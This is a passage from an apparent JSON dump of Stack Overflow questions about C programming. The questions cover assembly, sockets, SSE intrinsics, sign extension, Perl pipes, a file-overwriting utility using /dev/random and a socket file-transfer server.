End:\n0x018: 30810a000000 | irmovl  $10, %ecx     # c = 10;\n0x01e: 10           | halt\n</code></pre>\n\n<ul>\n<li>This has not been assembled right. I was told that wherever a label is encountered, it is replaced by the address of where it is found in the program. If the first number entered is larger, the instruction at line <b>0x00a</b> is <b>7514000000</b>. This is telling the program counter to go to line <b>0x014</b> (a line that doesn't even exist) when it should be telling it to go to <b>0x016</b>. The same problem exists for line <b>0x011</b>. Why is this happening?</li>\n<li>When I assemble the program using the address lines instead of labels, the result is printed, however the newline is not. How can I fix this?</li>\n<li>Finally, a minor question: If I did not have a comment as the first line, the first line of code is ignored. Is this supposed to happen?</li>\n</ul>\n\n<p>Thank you for your time, I look forward to any answers you can provide.</p>\n"},{"tags":["c","network-programming","tor"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12933780,"title":"Program on top of tor","body":"<p>Is there a way to write a program on top of tor?</p>\n\n<p>I would like to write a ncurses mail program that uses tor for connections; the base of my program will be done with GPGME api's - for encrypting and decrypting e-mail -,  therefore I would to connect my mail client on tor network for sending e-mail.</p>\n\n<p>The concept is simple:</p>\n\n<pre><code>alice : Mail -&gt; encrypting (bob pulic key) &gt; Tor network -&gt; Bob\nbob: decrypting mail -&gt; new mail -&gt; encrypting (alice pub key)  -&gt; Tor network -&gt; Alice \n</code></pre>\n\n<p>In these days I'm learning GPGME but my problem is Tor, is there a way to do that? API's?</p>\n"},{"tags":["c++","c","expression"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":125,"score":2,"question_id":13258782,"title":"Simplify this expression","body":"<p>Let <code>a</code>, <code>b</code> be positive integers with different values. Is there any way to simplify these expressions:</p>\n\n<pre><code>bool foo(unsigned a, unsigned b)\n{\n    if (a % 2 == 0)\n      return (b % 2) ^ (a &lt; b); // Should I write \"!=\" instead of \"^\" ?\n    else      \n      return ! ( (b % 2) ^ (a &lt; b) ); // Should I write \"(b % 2) == (a &lt; b)\"? \n}\n</code></pre>\n\n<p>I am interpreting the returned value as a boolean.</p>\n"},{"tags":["c","osx","posix","stdio"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":41,"score":-1,"question_id":13259699,"title":"Reading bytes from /dev/random fails","body":"<p>I have a piece of code written in POSIX compliant C and it doesn't seem to work correctly. The goal is to read from /dev/random, the interface to the Linux/BSD/Darwin kernel's random number generator and output the written byte to a file. I'm not quite sure what I'm overlooking as I'm sure I've covered every ground. Anyway, here it is:</p>\n\n<pre><code>int incinerate(int number, const char * names[]) {\nif (number == 0) {\n    // this shouldn't happen, but if it does, print an error message\n    fprintf(stderr, \"Incinerator: no input files\\n\");\n    return 1;\n}\n\n// declare some stuff we'll be using\nlong long lengthOfFile = 0, bytesRead = 0;\nint myRandomInteger;\n\n// open the random file block device\nint zeroPoint = open(\"/dev/random\", O_RDONLY);\n\n// start looping through and nuking files\nfor (int i = 1; i &lt; number; i++) {\n    int filePoint = open(names[i], O_WRONLY);\n\n    // get the file size\n    struct stat st;\n    stat(names[i], &amp;st);\n    lengthOfFile = st.st_size;\n    printf(\"The size of the file is %llu bytes.\\n\", lengthOfFile);\n\n    while (lengthOfFile != bytesRead) {\n        read(zeroPoint, &amp;myRandomInteger, sizeof myRandomInteger);\n        write(filePoint, (const void*) myRandomInteger, sizeof(myRandomInteger));\n        bytesRead++;\n    }\n\n    close(filePoint);\n}\n\nreturn 0;\n}\n</code></pre>\n\n<p>Any ideas? This is being developed on OS X but I see no reason why it shouldn't also work on Linux or FreeBSD.</p>\n\n<p>If it helps, I've included the following headers:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/stat.h&gt;\n</code></pre>\n"},{"tags":["c","windows","winapi","client-server","message-queue"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13259499,"title":"WinAPI Message Queue example","body":"<p>Does anyone know where can I find a simple client/server WinAPI message queue example?</p>\n\n<p>I'd like to create a program that sends data from a client to a server using message queues and I can't find anything useful on the web.</p>\n\n<p>Thank you.</p>\n"},{"tags":["c#","java","c++","c"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":2,"view_count":153,"score":1,"question_id":13259169,"title":"Should break statements be avoided?","body":"<p>Should a developer avoid using <code>break</code> statements as much as possible in Java, C#, and C++, C. I know using <code>goto</code> statements are deemed as bad practice but what about <code>break</code> statements to exit a loop ahead of time</p>\n"},{"tags":["android","c","android-ndk"],"answer_count":4,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":2675,"score":4,"question_id":8698798,"title":"How to compile and run a C/C++ program on the Android system","body":"<p>Q1) I want to run a simple c program on android emulator.I am using <code>windows xp</code> os on my machine. I have installed <code>sdk, jdk, eclipse</code> for android development and succeeded running android application on AVD.</p>\n\n<p>Q2) I just need to know is there any way to run a C program(without any java) on <code>AVD</code>. On my machine I have installed arm and using that I have compiled a C program. </p>\n\n<p>Q3) I also want to know is it possible to push the compiled binary into android device or <code>AVD</code> and run using the terminal of the  android device or <code>AVD</code>? </p>\n\n<p>May be I am asking some stupid questions but I really need some help. Thanks for your time.</p>\n"},{"tags":["c","perl","pipes"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":53,"score":5,"question_id":13259004,"title":"Concurrent Input and Output in Perl","body":"<p>Recently I've taken up learning pipes for fun. I've gotten stuck on a few parts but I have it mostly figured out I think, however I cannot figure out how to get input to forward to a program and output from that program at the same time.</p>\n\n<p>Currently I have this Perl script that handles the piping:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse threads;\nuse FileHandle;\nuse IPC::Open2;\n\nmy $cv_program = \"./test\"; #test is the compiled C program below\nmy $cv_message = \"\";\nmy $cv_currentkey = \"\";\nmy $pid = open2(*PIN, *POUT, $cv_program);\nmy $thread_pipeout = threads-&gt;create('PIPEOUT', \\&amp;PIN);\n\n$thread_pipeout-&gt;detach();\n\nwhile($cv_currentkey ne \"\\n\")\n{\n    $cv_currentkey = getc(STDIN);\n    $cv_message .= $cv_currentkey;\n}\nprint POUT $cv_message;\n\nsub PIPEOUT\n{\n    my $PIN = shift;\n    while(&lt;PIN&gt;)\n    {\n        print $_;\n    }\n}\n</code></pre>\n\n<p>And then I have this C program which just outputs something, asks for a string, then prints that string:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc, char const *argv[])\n{\n    char input[100] = {0};\n\n    printf(\"This is a test.\\n\");\n    fgets(input, 100, stdin);\n    printf(\"You entered %s\\n\", input);\n    return 0;\n}\n</code></pre>\n\n<p>The output from running the Perl script is:</p>\n\n<pre><code>~/Programming/Perl Pipes$ ./pipe.pl\nHello\nThis is a test.\nYou entered Hello\n</code></pre>\n\n<p>Notice it blocks while taking input and then prints everything in a block after. I need it to print This is a test, then wait for input like the actual program would.</p>\n\n<p>Also I'll note is the reason I use getc instead of STDIN in the Perl script is because I couldn't find a way to get STDIN to not block the output from test.c, however getc isn't working too well at the moment either.</p>\n"},{"tags":["c","compilation"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13259016,"title":"Cross compiling source from windows to linux","body":"<p>This is my make file</p>\n\n<pre><code>EXE     = signsrch\nCFLAGS  += -s -O2\nPREFIX  = /usr/local\nBINDIR  = $(PREFIX)/bin\nSRC     = $(EXE).c\n\nall:\n    $(CC) $(CFLAGS) -c disasm.c\n    $(CC) $(CFLAGS) -c asmserv.c\n    $(CC) $(SRC) $(CFLAGS) -o $(EXE) *.o\n\ninstall:\n    install -m 755 -d $(BINDIR)\n    install -m 755 $(EXE) $(BINDIR)/$(EXE)\n\n.PHONY:\n    install\n</code></pre>\n\n<p>I want to cross compile it for my ubuntu and I tried:</p>\n\n<pre><code>make ARCH=arm CROSS_COMPILE=arm-none-linux-gnueabi-\n</code></pre>\n\n<p>but I get unknown type name errors with a bunch of âDWORDâ</p>\n\n<p>Help?</p>\n"},{"tags":["c","sockets","ip-address","gethostbyname"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":13259039,"title":"How to use gethostbyname twice in code","body":"<p>I have this code:</p>\n\n<pre><code>struct hostent *host;\nstruct hostent *serverHost;\nif ((host = gethostbyname(param.ipadress)) == NULL)\n{\n  return -1;\n}\nif ((serverHost = gethostbyname(param.dnsserver)) == NULL)\n{\n  return -1;\n}\n</code></pre>\n\n<p>and now when I tried <code>host-&gt;h_addr</code> it contains address from <code>param.dnsserver</code>. What is wrong? What I am doing wrong?</p>\n"},{"tags":["c","gcc","assembly","x86","inline-assembly"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13258464,"title":"Clobber list for rep_movsl","body":"<p>I'm trying out the examples of inline assembly in: <a href=\"http://www.delorie.com/djgpp/doc/brennan/brennan_att_inline_djgpp.html\" rel=\"nofollow\">http://www.delorie.com/djgpp/doc/brennan/brennan_att_inline_djgpp.html</a>\nBut something is confusing me about clobbering:</p>\n\n<p><ul>\n<li>About behavior of clobber<br>\nClobbering essentially tells GCC to not trust the values in the specified register/memories.</p>\n\n<blockquote>\n  <p>\"Well, it really helps when optimizing, when GCC can know exactly what you're doing with the registers before and after....It's even smart enough to know that if you tell it to put (x+1) in a register, then if you don't clobber it, and later C code refers to (x+1), and it was able to keep that register free, it will reuse the computation. Whew.\" </li>\n  </ul>\n  Does this paragraph means clobbering will disable common sub-expression elimination?</p>\n</blockquote>\n\n<ul>\n<li><p>There's some inconsistency in the tutorial about the clobber list:<br>\nFor registers specified in input/output list, there's no need to put them in clobber list as GCC knows; However in the example about rep_movsl (or rep_stosl):</p>\n\n<p>asm (\"cld\\n\\t\"\n     \"rep\\n\\t\"\n     \"stosl\"\n     : /* no output registers */\n     : \"c\" (count), \"a\" (fill_value), \"D\" (dest)\n     : \"%ecx\", \"%edi\" );</p></li>\n</ul>\n\n<p>although \"S, D, c\" are in the output operands, they are listed as clobbered again.\nI tried a simple snippet in C:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\nint main()\n{\n  int a[] = {2, 4, 6};\n  int b[3];\n  int n = 3;\n  int v = 12;\n  asm (\"cld\\n\\t\"\n       \"rep\\n\\t\"\n       \"movsl\"\n       :\n       : \"S\" (a), \"D\" (b), \"c\" (n)\n       : );\n//     : \"%ecx\", \"%esi\", \"%edi\" );\n  printf(\"%d\\n\", b[1]);\n}\n</code></pre>\n\n<p>If I use the commented clobber list, GCC will complain: </p>\n\n<blockquote>\n  <p>a.c:8:3: error: can't find a register in class ‘CREG’ while reloading\n  ‘asm’ a.c:8:3: error: ‘asm’ operand has impossible constraints</p>\n</blockquote>\n\n<p>If I use empty clobber list, it will compile and the output is 4.</p>\n"},{"tags":["objective-c","c","variables","binding","scope"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13255942,"title":"Objective C: Names, Bindings, and Scopes","body":"<p>I am looking to acquire information about how Objective-C identifies an entity in a program. How many characters are allowed, etc. I have tried to Google it, but I couldn't come up with anything. Since it was party based on C, does the naming/binding/scope follow that of C? Any help would be appreciated. If you have any links that talk about these things it would also be helpful. Thanks in advanced. </p>\n"},{"tags":["c","maximum","minimum","sentinel"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":39,"score":1,"question_id":13257938,"title":"maximum and minimum - sentinel controlled repetition","body":"<p>I have to find the maximum and the minimum using a sentinel controlled repetition.</p>\n\n<p>\"maximum” is not working properly. Can anyone help me with some clue about what’s wrong in my code? </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\nint main() { \n  int number;\n  int min;\n  int max;\n\n  do {\n    printf(\"Enter a number (-1 to quit): \");\n    scanf(\"%d\",&amp;number);\n    if( number &gt;= 0 ) {\n      if(number &lt; min )\n        min = number;\n      if( number &gt; max )\n        max = number;\n\n    }\n    else if( number &lt; 1 )\n      printf(\"the number is not valid \\n\");\n  } \n\n  while( number != -1 );\n\n  printf(\"Minimum=%d\\n\",min);\n  printf(\"Maximum=%d\\n\",max);\n\n  system(\"pause\");\n\n  return 0;\n}\n</code></pre>\n"},{"tags":["java","c","sockets"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13256373,"title":"Handling C char arrays with Java char arrays","body":"<p>Through a socket I am sending information from a program written in C to a program written in Java.</p>\n\n<p>Through the program in C, I am sending two bytes through a char array (using an internet socket), and the received information in Java is stored in a char array also.</p>\n\n<p>My main problem is that the received information in the Java array does not correspond properly to the transmitted information from the C program.</p>\n\n<p>I have read that the chars in Java are 16 bits long, and the chars in C are 8 bits long. That may be the problem, but I do not know how to handle/solve that.</p>\n\n<p>The C code to send information is the following:</p>\n\n<pre><code>char buffer[256];\nbzero(buffer,256);\nn = read(fd, buffer, 255);  // getting info from an uart port, which works properly\nn = write(sockfd,buffer,3); // send the information through the socket\n</code></pre>\n\n<p>Part of the Java code (for an Android app) is the following:</p>\n\n<pre><code>char[] buffer = new char[256];\nBufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\nint readX = in.read(buffer, 0, 3);\nif (readX &gt; 0) { // I am using a handler to manipulate the info\n    Message msg = new Message();\n    msg.obj = buffer;\n    mHandler.sendMessage(msg);\n} \n....\n// Part of the handler is the following:\nmHandler = new Handler() {\n    @Override\n    public void handleMessage(Message msg) {\n            char[] buffer;\n            buffer = (char[])msg.obj; // the information here is different from the one sent from the C program\n            ....\n    }\n}\n</code></pre>\n\n<p>Any suggestion to solve this problem I would really appreciate it. </p>\n\n<p>Thanks in advance, Gus. </p>\n"},{"tags":["c","pcap"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13253717,"title":"pcap C check if in monitor mode","body":"<p>I am capturing in C with libpcap on a device, that does not support to be set in monitor mode via pcap (pcap_can_set_rfmon returns -6). But i can set it in monitor mode with iw and iwconfig on command line, so I do that manually and then run the program.\nI am also capturing on my Mac where I can set the network device to monitor mode with the pcap function pcap_set_rfmon.</p>\n\n<p>I was wondering if there is a way with pcap to actually check if the device already is in monitor mode, just for error handling and convenience reasons. I didn't find an answer (either positive nor negative). So maybe someone here can answer this?</p>\n"},{"tags":["c","kernel","driver","mode"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":13214541,"title":"How to generate .exe drivers instead than .sys?","body":"<p>I'm new in kernel mode world. I've tried to write a simple \"hello world\" driver in a Windows 7 virtual machine, I'm using WDK 7600.16385.1 -> x86 Free Build Environment for compilation, when it does, the generated driver is a .sys file extension, so I'd like to know if is possible to set up the compiler to generate an .exe file, so thereby a user can run it by double-clicking the executable. </p>\n\n<p>I thought that perhaps, when I install some driver and the \"setup\" is a .exe file, in fact it isn't really the driver, it is a program that installs the driver (in .sys extension) on your computer, so the .exe file is just the installer and not the driver itself. But I am not sure if this is true.</p>\n\n<p>If you could give me some information about generating a driver for Windoes, I'll be eternally grateful!</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["c","assembly","simd","intrinsics"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":13257166,"title":"print a __m128i variable","body":"<p>I'm trying to learn to code using intrinsics and below is a code which does addition</p>\n\n<p><code>compiler used: icc</code></p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;emmintrin.h&gt;\nint main()\n{\n        __m128i a = _mm_set_epi32(1,2,3,4);\n        __m128i b = _mm_set_epi32(1,2,3,4);\n        __m128i c;\n        c = _mm_add_epi32(a,b);\n        printf(\"%d\\n\",c[2]);\n        return 0;\n}\n</code></pre>\n\n<p>I get the below error:</p>\n\n<pre><code>test.c(9): error: expression must have pointer-to-object type\n        printf(\"%d\\n\",c[2]);\n</code></pre>\n\n<p>How do I print the values in the variable <code>c</code> which is of type <code>__m128i</code></p>\n"},{"tags":["c++","c","input","sscanf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":42,"score":-4,"question_id":13257170,"title":"sscanf multiple inputs","body":"<p>I have an input string that I need to parse to get anywhere from 4 - 16 variables. Using sscanf I can get the first few variables but the rest show as 0. What do I need to do to get the rest?</p>\n\n<p>Line format: COMMAND [1 - 16 float variables separated by a space] </p>\n\n<p>The line is coming in from a file using something like this: </p>\n\n<p>fgets(line, 20, file);</p>\n\n<p>sscanf(line, \"%s\", param);</p>\n\n<p>string parString(param);</p>\n\n<p>if(parString == \"NEAR\"){</p>\n\n<pre><code>      sscanf(line, \"%s %f\", param, &amp;np);\n      printf(\"%s %f\\n\", param, np);\n</code></pre>\n\n<p>}...</p>\n\n<p>Depending on the first word in the line I know how many variables I need to read in for that case. </p>\n"},{"tags":["c","algorithm"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12346348,"title":"Find the longest increasing subsequence of a list in C","body":"<p>I'm having problems trying to find the elements that form the Longest Increasing Subsequence of a given list.</p>\n\n<p>I have the algorithm to find the value of a given item of the list, and I understand the method it uses, I just don't know what to add and where to add it so that I have the numbers that compose the L.I.S.</p>\n\n<p>Here is what I'm doing now: </p>\n\n<pre><code>for (A[0] = N[0], i=lis=1; i&lt;n; i++) {\n    int *l = lower_bound(A, A+lis, N[i]);\n    lis = max(lis, (l-A)+1);\n    *l = N[i];\n}\n</code></pre>\n\n<p><code>A</code> is an array that stores the partial L.I.S., but at some point it changes because there may be a different solution. <code>N</code> is the array of elements.</p>\n\n<p>How can I get from here to finding the longest increasing subsequence of <code>N</code>?</p>\n"},{"tags":["c","binary","integer","sign"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1551,"score":1,"question_id":6215256,"title":"Sign extension from 16 to 32 bits in C","body":"<p>I have to do a sign extension for a 16-bit integer and for some reason, it seems not to be working properly. Could anyone please tell me where the bug is in the code? I've been working on it for hours.</p>\n\n<pre><code>int signExtension(int instr) {\n    int value = (0x0000FFFF &amp; instr);\n    int mask = 0x00008000;\n    int sign = (mask &amp; instr) &gt;&gt; 15;\n    if (sign == 1)\n        value += 0xFFFF0000;\n    return value;\n}\n</code></pre>\n\n<p>The instruction (instr) is 32 bits and inside it I have a 16bit number.</p>\n"},{"tags":["c","if-statement","comparison","sse","intrinsics"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":37,"score":0,"question_id":13256983,"title":"SSE Comparison Intrinsics - How to get 1 or 0 from a comparison?","body":"<p>I am trying to write the equivalent of an if statement with SSE intrinsics.</p>\n\n<p>I am using <code>__m128 _mm_cmplt_ps(__m128 a, __m128 b)</code> to do the comparison a &lt; b, and this returns <code>0xffffffff</code> or <code>0x0</code> if the comparison was respectively true or false. I would like to convert these values into 1 and 0. In order to do this, is it correct to implement the logical \"and\" <code>__m128 _mm_and_ps(__m128 c , __m128 d)</code>, where <code>c</code> is the result of the conversion and <code>d</code> is, e.g., <code>0xffffffff</code>?</p>\n\n<p>Thank you for your attention.</p>\n"},{"tags":["c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":58,"score":-1,"question_id":13256425,"title":"Confused by weird behavior in C code","body":"<p>Consider the following C - Code:</p>\n\n<pre><code>struct ScoredGamestate\n{\n    GameState88 gameState;\n    int whitePlayerScore; \n};\n\nint bestScore;\n\nassert(scoredState-&gt;whitePlayerScore &gt; -1000 &amp;&amp; \nscoredState-&gt;whitePlayerScore &lt; 1000);\n\nif (scoredState-&gt;gameState.playerOnMove == PlayerWhite)\n{\n    bestScore = scoredState-&gt;whitePlayerScore;\n}\nelse\n{\n    bestScore -(scoredState-&gt;whitePlayerScore);\n}\n\nassert(bestScore &gt; -1000 &amp;&amp; bestScore &lt; 1000);\n</code></pre>\n\n<p>It should be logical, that after the code, bestScore is always +/- \"whitePlayerScore\"</p>\n\n<p>But what happens in my debugger (visual studio  2010 C++ express edition),\n\"whitePlayerScore\" is 50, but bestScore becomes like -8908234</p>\n\n<p>(the first assertion never fires, but always the second)</p>\n\n<p>How can this happen ?</p>\n"},{"tags":["c++","c","behavior","c++-faq"],"answer_count":5,"favorite_count":43,"up_vote_count":70,"down_vote_count":3,"view_count":3276,"score":67,"question_id":2397984,"title":"Undefined, unspecified and implementation-defined behavior","body":"<p>What is the difference between undefined, unspecified, and implementation-defined behavior in C and C++?</p>\n"},{"tags":["c","assembly","callstack"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":72,"score":4,"question_id":13256461,"title":"Counting number of frames on stack","body":"<p>To start off, I need to write a assembly (Intel IA-32) function that returns the contents of the caller's frame pointer. I don't think I'm doing it correctly, but what I came up with was </p>\n\n<pre><code>pushl %ebp\nmovl %esp, %ebp\nmovl %eax, 4(ebp)\nleave\nret\n</code></pre>\n\n<p>However, I'm supposed to use that in a c function to count the number of frames on the stack, and I'm really not sure at all how that is supposed to work. Am I supposed to jump to the value in the old ebp, and then call the function again? Any guidance would be greatly appreciated. </p>\n"},{"tags":["c","floating-point","precision","exponent","arbitrary"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":100,"score":6,"question_id":12875930,"title":"Is there an arbitrary precision floating point library for C/C++ which allows arbitrary precision exponents?","body":"<p>I'm looking for an arbitrary precision floating point library for C/C++ (plain C is preferred). I need arbitrary precision exponents. GMP and MPFR use fixed size exponents, so they are ineligible (I've some ideas for workarounds, but I prefer an out-of-the-box solution). It would be an nice feature if the exponent precision can be adjusted automatically to prevent infinity-values.\nIf you know very sure that such an library does not exist it would also be a helpful information.</p>\n\n<p>Thanks in advance.</p>\n\n<p>Peter</p>\n"},{"tags":["java","c","perl","compiled","interpreted"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":2,"view_count":78,"score":-2,"question_id":13256575,"title":"Examples of when we'll use interpreted language over compiled language?","body":"<p>I understand the differences between interpreted and compiled languages, but if someone could provide some examples of situations when one is likely to use interpreted languages over compiled languages, as well as situations when one is likely to use compiled languages over interpreted languages, it'd be really helpful. Thanks!</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":58,"score":-2,"question_id":13256009,"title":"See the output of a .s to implement in c","body":"<p>I have been given a .s file(assembly file) containing assembly code how can I see what it does so that I can implement the same function in c. Can i compile .s file to see what it does. What are my options to see what the .s file does and implement the same function in c.</p>\n"},{"tags":["c++","c","windows","dll"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13205108,"title":"Where to call LoadLibrary in a DLL?","body":"<p>I'm making a DLL that dynamically loads another DLL (winsock) using LoadLibrary. I read that I should not call LoadLibrary in DllMain, but I use it repeatedly and don't want to have to call LoadLibrary/GetProcAddress each time I use it. So my questions are:</p>\n\n<ul>\n<li><p>Where is the best place to call LoadLibrary within a DLL?</p></li>\n<li><p>How fast is LoadLibrary/GetProcAddress? Is it a lot of overhead to do so in each function?</p></li>\n</ul>\n"},{"tags":["c"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":1342,"score":6,"question_id":5814072,"title":"Sign extend a nine-bit number in C","body":"<p>I have a short, <code>instr</code>, that looks like this:</p>\n\n<pre><code>1110xxx111111111\n</code></pre>\n\n<p>I need to pull out bits 0-9, which I do with <code>(instr &amp; 0x1FF)</code>. This quantity is then stored in a new short. The problem is that when this occurs, it becomes <code>0x0000000111111111</code>, not <code>0x1111111111111111</code> like I want. How can I fix this? Thanks!</p>\n\n<h1>EDIT</h1>\n\n<p>Here's the code:</p>\n\n<pre><code>short instr = state-&gt;mem[state-&gt;pc];\nunsigned int reg = instr &gt;&gt; 9 &amp; 7; // 0b111\nstate-&gt;regs[reg] = state-&gt;pc + (instr &amp; 0x1FF);\n</code></pre>\n\n<p>This is a simulator that reads in assembly. <code>state</code> is the machine, <code>regs[]</code> are the registers and <code>pc</code> is the address of the current instruction in <code>mem[]</code>.</p>\n\n<p>This is fine if the last nine bits represent a positive number, but if they're representing -1, it's stored as all 1's, which is interpreted as a positive value by my code.</p>\n"},{"tags":["c","unix","ubuntu","network-programming","ipv6"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13255071,"title":"set hop limit of IPv6 packet","body":"<p>I can't figure out why the hop limit is <strong>always</strong> set to <strong>64</strong> in my program. This is fragment where I'm creating ICMP6 packet and sending it.</p>\n\n<pre><code>if ((socd = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)) &lt; 0) {\n    perror(\"socket() failed\");\n    return 1;\n}\n\nicmp6 = (icmp6_hdr *)malloc(sizeof(icmp6_hdr));\nicmp6-&gt;icmp6_type = ICMP6_ECHO_REQUEST;\nicmp6-&gt;icmp6_code = 0;\nicmp6-&gt;icmp6_id = pid;\n\nsendSockAddr6.sin6_scope_id = pid;\nsendSockAddr6.sin6_port = 0;\nsendSockAddr6.sin6_family = AF_INET6;\nsendSockAddr6.sin6_flowinfo = 0;\nmemcpy(&amp;sendSockAddr6.sin6_addr, addr6.s6_addr, sizeof(addr6.s6_addr));\n\nunsigned short int hop = 1;\nsetsockopt(socd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, (const char *)&amp;hop, sizeof(hop));\n\nicmp6-&gt;icmp6_cksum = 0;\nicmp6-&gt;icmp6_seq = seq;\nicmp6-&gt;icmp6_cksum = checksum((const unsigned short *)icmp6, sizeof(icmp6_hdr));\n\nsendto(socd, (char *)icmp6, sizeof(icmp6_hdr), 0, (sockaddr *)&amp;sendSockAddr6, sizeof(sendSockAddr6)); \n</code></pre>\n\n<p>Do you anybody know why isn't the hop limit set by my setsockopt() ?   </p>\n"},{"tags":["c","sockets"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13242971,"title":"Stoping the recv from server when client finishes reading and sending the file","body":"<p>Basically i use a recv in a while in order to read the data sent from my client. Client finishes reading the file and sending it but server remains in the while. How can i notify the server that the file sending is done meaning feof on clients side?</p>\n\n<p>SERVER</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;time.h&gt;\n#include &lt;sys/types.h&gt;      /*For Sockets*/\n#include &lt;sys/socket.h&gt;     /*For Sockets*/\n#include &lt;netdb.h&gt;      /*For gethostbyaddr()*/\n#include &lt;netinet/in.h&gt;     /*For internet sockets*/\n#include &lt;dirent.h&gt;\n\n\n/*Function for creating the lof file of Server*/\n\nvoid log_event (char *message,char *filename)\n{\n\nFILE *file; \nchar *log_this;\n\ntime_t system_time; //Get the system time\ntime(&amp;system_time);\n\nlog_this=strcat(ctime(&amp;system_time),message); //Create the message to log \n\n/*Check for filename and log as appropiate*/\n\nif (filename!=NULL)\n    {\n        file = fopen(filename,\"a+\"); \n        fprintf(file,\"%s\",log_this); /*writes the message*/\n        fclose(file); /*done!*/     \n    }\nelse    \n    {\n        file = fopen(\"ftp_tracelog.txt\",\"a+\"); \n        fprintf(file,\"%s\",log_this); /*writes the message*/\n        fclose(file); /*done!*/ \n    }\n\n}\n\nint main (int argc,char *argv[])\n{\n\n/*DECLERATIONS*/\n\nchar *filename; \nchar message [1024];\nchar *temp;\nchar temp_2[1024];\nchar buf[1024];\nchar *p=buf;\nssize_t  bytesRemaining = 1024;\nssize_t  bytesRemaining2 = 50;\nchar request[50];\nchar command[5];\nchar c[50];\nchar copy[1024]=\"COPY_OF_\";\nFILE *fp;\nDIR *dp;\nchar list[1024];\nint port,sock,newsock,serverlen,clientlen,fname_len,recvMsgSize,i,len,count;\n\n\nstruct sockaddr_in server,client;\nstruct sockaddr *serverptr, *clientptr;\nstruct hostent *rem;\nstruct dirent *ep;     \n\n/*END OF DECLERATIONS*/\n\n/*Check for required arguments and get them as appropiate*/\n\nif (argc &lt; 2) { \n        /* Check if server's port number is given */\n        printf(\"Please give the port number!!!\\n\");\n        exit(1);\n        }\n\n/*if server's port number is given and filename for log is given*/\n\nif(argc&gt;2){\n    filename=argv[1];\n    port=atoi(argv[2]);\n       }\n\n/*If only port is given*/\nif (argc==2){\n    port=atoi(argv[1]);\n    filename=NULL;\n         }\n\ntemp=\"--Server is Starting!!--\";\nsprintf(message,\"%s\\n\",temp);\nlog_event(message,filename);\n\n/* Create socket */\n\nif ((sock = socket(PF_INET, SOCK_STREAM, 0)) &lt; 0)\n{perror(\"socket\"); exit(1); }\n\nserver.sin_family = PF_INET; /* Internet domain */\nserver.sin_addr.s_addr = htonl(INADDR_ANY); /* My Internet address */\nserver.sin_port = htons(port); /* The given port */\nserverptr = (struct sockaddr *) &amp;server;\nserverlen = sizeof (server);\n\n/* Bind socket to address */\n\nif (bind(sock, serverptr, serverlen) &lt; 0) {\nperror(\"bind\"); exit(1); }\n\n/* Listen for connections */\n\nif (listen(sock, 40) &lt; 0) { /* 5 max. requests in queue */\nperror(\"listen\"); exit(1); }\n\ntemp=\"---Listening for connections to port\";\nsprintf(temp_2,\"%d----\",port);\nsprintf(message,\"%s:%s\\n\",temp,temp_2);\nlog_event(message,filename);\n\n/*Accepting Connecttion*/\n\nwhile(1) {\n    clientptr = (struct sockaddr *) &amp;client;\n    clientlen = sizeof(client);\n\n        /* Accept connection */\n        if ((newsock = accept(sock, clientptr, &amp;clientlen)) &lt; 0){ \n        